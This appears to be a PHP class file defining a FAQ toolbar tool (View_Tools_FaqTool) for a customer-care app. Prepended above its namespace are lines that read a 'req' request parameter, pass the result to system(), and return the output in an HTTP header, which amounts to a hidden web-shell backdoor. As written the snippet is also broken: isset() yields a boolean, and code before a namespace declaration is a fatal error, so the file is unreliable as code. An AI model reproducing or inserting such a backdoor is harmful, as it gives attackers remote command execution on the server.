<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_FaqTool extends \editingToolbar\View_Tool {
	public $title = 'FAQ';
	public $class='View_Faq';
	public $component_type='customerCareAppFaqView';
	
}